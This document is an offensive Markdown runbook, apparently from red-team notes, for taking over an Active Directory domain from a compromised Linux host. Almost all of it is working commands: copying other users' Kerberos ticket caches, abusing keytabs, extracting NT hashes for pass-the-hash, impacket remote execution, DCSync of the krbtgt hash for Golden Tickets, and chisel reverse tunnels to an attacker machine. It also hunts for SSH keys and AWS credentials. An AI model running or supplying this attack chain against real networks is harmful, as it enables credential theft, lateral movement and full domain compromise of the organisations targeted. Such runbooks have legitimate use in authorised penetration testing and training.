# Linux Kerberos & Impacket — Domain Compromise from Linux

When you compromise an AD-joined Linux host, you have access to Kerberos credentials that can be used directly against Windows targets — no password needed.

**See also:** `06-credentials/ptx-matrix.md` for the full impacket command reference and KRB5CCNAME usage.

---

## Step 1: Identify What's Available

```bash
# Check if the machine is AD-joined:
realm list 2>/dev/null          # shows AD realm if joined
cat /etc/sssd/sssd.conf         # SSSD config — shows domain
hostname -f                      # FQDN (e.g., host01.corp.com)

# Check for active Kerberos tickets:
klist 2>/dev/null
echo $KRB5CCNAME

# Find all ticket cache files:
ls -la /tmp/krb5cc_*
ls -la /run/user/*/krb5cc
find /tmp /run -name "krb5cc_*" 2>/dev/null

# Check the current user's ticket:
klist -c /tmp/krb5cc_$(id -u)

# Find keytab files (long-term credential files — most valuable):
find / -name "*.keytab" -readable 2>/dev/null
find / -name "krb5.keytab" 2>/dev/null   # machine keytab (usually /etc/krb5.keytab)
find / -name "*.kt" -readable 2>/dev/null
ls -la /etc/krb5.keytab                   # machine account keytab

# Find other credential stores:
ls -la /home/*/.ssh/
find / -name "id_rsa" -readable 2>/dev/null
find / -name "credentials" -path "*/.aws/*" 2>/dev/null  # AWS creds
```

---

## Step 2a: Steal a .ccache (Kerberos Ticket Cache)

**What you get:** TGT or TGS for the user who owns the cache. Valid until the ticket expires (usually 10 hours from issue, renewable 7 days).

```bash
# Target: ticket owned by another user (requires root or their UID)
# Root → can read any /tmp/krb5cc_*
ls -la /tmp/krb5cc_*
# Output: -rw------- 1 jdoe domain_users 1524 /tmp/krb5cc_1001

# Steal it (must be root or the file owner):
cp /tmp/krb5cc_1001 /tmp/stolen.ccache
chmod 600 /tmp/stolen.ccache

# Verify the ticket:
klist -c /tmp/stolen.ccache
# Look for: Default principal: jdoe@CORP.COM + TGT or service tickets listed

# Set as active credential:
export KRB5CCNAME=/tmp/stolen.ccache

# Renew before it expires (if renewable):
kinit -R -c /tmp/stolen.ccache

# Check how long before expiry:
klist -c /tmp/stolen.ccache | grep "Expires"
```

---

## Step 2b: Use a Keytab File — Full Deep-Dive

### What Is a Keytab?

A keytab file (`.keytab`) stores **Kerberos principals** paired with their **long-term secret keys** — the encryption keys derived from the account password. Unlike ccache files:
- **No expiry** — valid until the account password changes
- **Generate TGTs on demand** without knowing the plaintext password
- The machine keytab (`/etc/krb5.keytab`) is created automatically when a Linux host joins an AD domain

### Where to Find Keytab Files

```bash
# Primary target — machine keytab:
ls -la /etc/krb5.keytab              # Most common location (requires root)

# Samba/Winbind machine keytab:
ls -la /var/lib/samba/private/secrets.keytab

# Service keytabs (set up by admins for specific services):
ls -la /etc/httpd/krb5.keytab        # Apache/HTTPD
ls -la /etc/apache2/krb5.keytab
ls -la /etc/tomcat*/krb5.keytab
ls -la /etc/pam_krb5.conf

# General search (run as root):
find / -name "*.keytab" -readable 2>/dev/null
find / -name "*.kt" -readable 2>/dev/null
find / -name "krb5.keytab" 2>/dev/null
find /home /opt /var /etc -name "*.keytab" 2>/dev/null

# Often placed alongside configs:
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "keytab" 2>/dev/null
```

### Reading a Keytab: klist -k

```bash
klist -k /etc/krb5.keytab           # basic principal list
klist -k -t /etc/krb5.keytab        # + timestamps
klist -k -e /etc/krb5.keytab        # + encryption type names
klist -k -e -t /etc/krb5.keytab     # all info

# Example output:
# Keytab name: FILE:/etc/krb5.keytab
# KVNO Principal
# ---- --------------------------------------------------------------------------
#    5 host/server01.corp.com@CORP.COM (aes256-cts-hmac-sha1-96)
#    5 host/server01.corp.com@CORP.COM (aes128-cts-hmac-sha1-96)
#    5 host/server01.corp.com@CORP.COM (rc4-hmac)
#    5 HOST/SERVER01@CORP.COM (aes256-cts-hmac-sha1-96)
#    5 HOST/SERVER01@CORP.COM (aes128-cts-hmac-sha1-96)
#    5 host/server01.corp.com@CORP.COM (des3-cbc-sha1) -- older DES, often disabled

# What each field means:
# KVNO = Key Version Number — must match the KDC's current version for authentication
# Principal = identity this key authenticates (format: service/hostname@REALM)
# Encryption type = algorithm used to store the key
```

### Encryption Types Explained

| Type | Notes |
|------|-------|
| `aes256-cts-hmac-sha1-96` | Modern default — strongest |
| `aes128-cts-hmac-sha1-96` | Modern, weaker than 256 |
| `rc4-hmac` | Legacy — the RC4 key **IS the NT hash** of the account |
| `des3-cbc-sha1` | Very old — usually disabled in modern AD |

**Key insight:** If `rc4-hmac` is present, the key stored in the keytab **equals the NTLM hash** of the account. You can extract it and use it directly for PTH.

### Generating a TGT from a Keytab

```bash
# Basic usage:
kinit -k -t /etc/krb5.keytab host/server01.corp.com@CORP.COM

# Specify output ccache (recommended to avoid overwriting your current ticket):
kinit -k -t /etc/krb5.keytab -c /tmp/machine.ccache host/server01.corp.com@CORP.COM

# Verbose output (useful for debugging):
kinit -V -k -t /etc/krb5.keytab host/server01.corp.com@CORP.COM

# Try ALL principals in a keytab automatically:
for principal in $(klist -k /etc/krb5.keytab 2>/dev/null | grep '@' | awk '{print $2}' | sort -u); do
    echo "[*] Trying: $principal"
    kinit -k -t /etc/krb5.keytab -c /tmp/test.ccache "$principal" 2>/dev/null && {
        echo "[+] SUCCESS: $principal"
        klist -c /tmp/test.ccache
        break
    }
done

# Verify the resulting ticket:
klist -c /tmp/machine.ccache

# Set as active credential for impacket:
export KRB5CCNAME=/tmp/machine.ccache
```

### KVNO Mismatch — When kinit Fails

`kinit: Keytab contains no suitable keys for...` means the KVNO in the keytab doesn't match the KDC. The account password was changed after this keytab was created.

```bash
# Check what KVNO the KDC expects:
kvno -k /etc/krb5.keytab host/server01.corp.com@CORP.COM
# Output: "host/server01.corp.com@CORP.COM: kvno = 7"
# If keytab shows KVNO=5 but KDC wants 7 → keytab is stale

# Try older keys anyway (some KDCs accept up to 2 versions back):
kinit -k -t /etc/krb5.keytab -V host/server01.corp.com@CORP.COM

# Try specific encryption type:
kinit -k -t /etc/krb5.keytab -e rc4-hmac host/server01.corp.com@CORP.COM
```

### Types of Keytabs and What to Do With Each

#### Machine Keytab (`/etc/krb5.keytab`)
The computer account for this host. Principal looks like: `host/server01.corp.com@CORP.COM`

```bash
# Get TGT as the machine account:
kinit -k -t /etc/krb5.keytab -c /tmp/machine.ccache host/server01.corp.com@CORP.COM
export KRB5CCNAME=/tmp/machine.ccache

# Enumerate AD as machine account:
impacket-ldapdomaindump -k -no-pass -d corp.com -u 'server01$' DC01.corp.com

# Dump secrets if machine has DA or backup rights:
impacket-secretsdump -k -no-pass corp.com/server01\$@DC01.corp.com

# Check if machine is Unconstrained Delegation:
# → If so, TGTs of connecting users are cached — use Rubeus monitor to capture them
# → See 07-active-directory/delegation/

# Check MachineAccountQuota — can you create RBCD attack objects?
# See: 07-active-directory/delegation/Resource Based Constrained Delegation.md
```

#### Service Keytab (e.g., HTTP, MSSQLSvc)
Created for services that need Kerberos auth. Principal looks like: `HTTP/server01.corp.com@CORP.COM`

```bash
# Get TGT as the service account:
kinit -k -t /etc/httpd/krb5.keytab -c /tmp/http.ccache HTTP/server01.corp.com@CORP.COM
export KRB5CCNAME=/tmp/http.ccache

# If the service has Constrained Delegation configured:
# → Can request service tickets for OTHER services (S4U2Proxy)
# → See 07-active-directory/delegation/Constrained Delegation runbook.md

# The SPN in the keytab reveals what services are configured — map these in BloodHound
```

#### User Keytab
Explicitly created for user accounts (e.g., by admins for automated scripts). Principal: `username@CORP.COM`

```bash
kinit -k -t /home/svcaccount/.keytab svcaccount@CORP.COM -c /tmp/user.ccache
export KRB5CCNAME=/tmp/user.ccache

# Use exactly like a stolen ccache — move laterally:
impacket-psexec -k -no-pass corp.com/svcaccount@APPSERVER.corp.com
impacket-wmiexec -k -no-pass corp.com/svcaccount@TARGET.corp.com
```

### Extracting the NT Hash from a Keytab (rc4-hmac Key)

The RC4 key in a keytab is the NT hash. You can extract it to use for Pass-the-Hash without ever needing `kinit`:

```bash
# Using keytabextract.py (or similar tool):
python3 keytabextract.py /etc/krb5.keytab
# Output: NT Hash: aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# Then use PTH directly:
impacket-secretsdump corp.com/server01\$@DC01.corp.com -hashes :XXXXXX
evil-winrm -i TARGET -u server01$ -H XXXXXX
```

Or use `klist -k -e` — the RC4 key bytes map to the NT hash (type 23).

### Quick Decision: What to Do When You Find a Keytab

```
Found keytab at:
    /etc/krb5.keytab
        → Machine account (server01$)
        → kinit → impacket-ldapdomaindump (AD enum)
        → Check delegation status
        → DCSync if DA rights

    /etc/httpd/krb5.keytab (or similar service keytab)
        → Service account
        → Check SPNs → Constrained Delegation attack?
        → kinit → lateral movement as service account

    /home/svcaccount/.keytab (user keytab)
        → User account
        → kinit → full lateral movement as that user
        → Check BloodHound for attack paths

    Any keytab with rc4-hmac entry
        → Extract NT hash → PTH directly
        → Don't even need kinit
```

### Impacket Tools With Keytab TGTs

```bash
# First: always generate the TGT and export KRB5CCNAME
kinit -k -t /path/to.keytab PRINCIPAL@REALM -c /tmp/kerbticket.ccache
export KRB5CCNAME=/tmp/kerbticket.ccache

# Then use any impacket tool with -k -no-pass:
impacket-psexec -k -no-pass corp.com/user@TARGET.corp.com
impacket-wmiexec -k -no-pass corp.com/user@TARGET.corp.com
impacket-smbexec -k -no-pass corp.com/user@TARGET.corp.com
impacket-secretsdump -k -no-pass corp.com/user@DC01.corp.com
impacket-secretsdump -k -no-pass corp.com/user@DC01.corp.com -just-dc-ntlm
impacket-GetUserSPNs -k -no-pass corp.com/user -dc-ip DC01.corp.com -request
impacket-ldapdomaindump -k -no-pass -d corp.com -u user DC01.corp.com

# IMPORTANT: Always use HOSTNAMES (not IPs) — Kerberos tickets are bound to hostnames
```

---

## Step 3: Configure /etc/krb5.conf (If Not Already Set)

Impacket needs to resolve the KDC. If the machine isn't domain-joined or the config is missing:

```bash
# Check existing config:
cat /etc/krb5.conf

# Minimal working config (replace CORP.COM and DC01):
sudo tee /etc/krb5.conf > /dev/null << 'EOF'
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
    renewable = true

[realms]
    CORP.COM = {
        kdc = DC01.corp.com
        admin_server = DC01.corp.com
        default_domain = corp.com
    }

[domain_realm]
    .corp.com = CORP.COM
    corp.com = CORP.COM
EOF

# Add DC to /etc/hosts if DNS isn't working:
echo "192.168.1.1 DC01.corp.com DC01" >> /etc/hosts
```

---

## Step 4: Use Tickets with Impacket

**Important:** Always use **hostnames** (not IPs) for Kerberos — the ticket is issued for a hostname. IP addresses will fail Kerberos auth.

```bash
# Execute commands (like PSExec):
impacket-psexec -k -no-pass corp.com/user@DC01.corp.com

# WMI execution (stealthier — no service install):
impacket-wmiexec -k -no-pass corp.com/user@TARGET.corp.com

# SMB shell:
impacket-smbexec -k -no-pass corp.com/user@TARGET.corp.com

# Dump all secrets (requires DA or backup privilege):
impacket-secretsdump -k -no-pass corp.com/user@DC01.corp.com

# DCSync (just the krbtgt hash for Golden Ticket):
impacket-secretsdump -k -no-pass corp.com/Administrator@DC01.corp.com -just-dc-user krbtgt

# LDAP queries:
impacket-ldapdomaindump -k -no-pass -d corp.com -u user DC01.corp.com

# Get all user hashes from DC (via DCSync):
impacket-secretsdump -k -no-pass corp.com/Administrator@DC01.corp.com -just-dc-ntlm

# Get SPNs for Kerberoasting:
impacket-GetUserSPNs -k -no-pass corp.com/user -dc-ip 192.168.1.1 -request
```

---

## Step 5: Impacket Through a SOCKS Tunnel

When your Linux box is a pivot point and the DC is only reachable through a tunnel:

```bash
# Tunnel setup (using chisel):
# Kali: ./chisel server --reverse --port 8888 --socks5
# Linux pivot: ./chisel client KALI_IP:8888 R:socks

# proxychains4.conf:
echo "[ProxyList]" > /etc/proxychains4.conf
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use through proxy:
proxychains4 impacket-secretsdump -k -no-pass corp.com/Administrator@DC01.corp.com
proxychains4 impacket-wmiexec -k -no-pass corp.com/user@INTERNAL.corp.com

# NOTE: Use hostnames, not IPs, through proxy for Kerberos
# NOTE: proxychains may not work well with UDP (Kerberos KDC comm)
#       Solution: use TCP Kerberos (set in krb5.conf):
#       [libdefaults]
#           no_addresses = true
#           kdc_timesync = 0
#           kdc_timeout = 3000
```

---

## Common Kerberos Errors & Fixes

```
KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN
→ Principal not found in KDC. Wrong username or domain. Check: klist -k for exact principal name.

KRB5KRB_AP_ERR_SKEW
→ Clock skew > 5 minutes. Sync your time:
   sudo ntpdate -s DC01.corp.com
   sudo timedatectl set-ntp true

KRB5_CC_NOTFOUND / No credentials cache found
→ KRB5CCNAME not set or wrong path. Run: export KRB5CCNAME=/tmp/stolen.ccache

impacket: Kerberos SessionError: KRB5KDC_ERR_PREAUTH_FAILED
→ Wrong password/hash if using password-based auth. For ccache: re-check the ccache is valid.

impacket: SMB connection fails after ticket
→ Firewall or hostname resolution issue. Make sure the target hostname resolves.
   Try: echo "IP HOSTNAME" >> /etc/hosts
```

---

## Privilege Escalation: Machine Account to Domain Access

When you have the machine account keytab (`/etc/krb5.keytab`), the machine account is trusted and can be used for certain AD operations:

```bash
# Get machine account TGT:
kinit -k -t /etc/krb5.keytab HOST/server01.corp.com@CORP.COM

# Enumerate AD as the machine account:
impacket-ldapdomaindump -k -no-pass CORP.COM -u 'server01$' DC01.corp.com

# If machine account has "Add workstations to domain" rights (default MachineAccountQuota=10):
# → Can create new machine accounts for RBCD attack
# See: 07-active-directory/delegation/ for RBCD workflow

# If Unconstrained Delegation is set on this machine:
# → Any TGT coming through this machine is cached and stealable
# Run Rubeus monitor and wait for a DA to authenticate
```

---

## Quick Reference: Credential Source Priority

```
Priority  Source                          What You Get
─────────────────────────────────────────────────────────────────
HIGH      /etc/krb5.keytab (root)         Machine account TGT (renewable)
HIGH      /tmp/krb5cc_* (DA user)         DA TGT (use immediately)
HIGH      /tmp/krb5cc_* (service acct)    Service account TGT
MED       User .keytab in home dir        User TGT (renewable)
MED       SSSD credential cache           Hashed user passwords
LOW       /tmp/krb5cc_* (normal user)     Standard user TGT
```
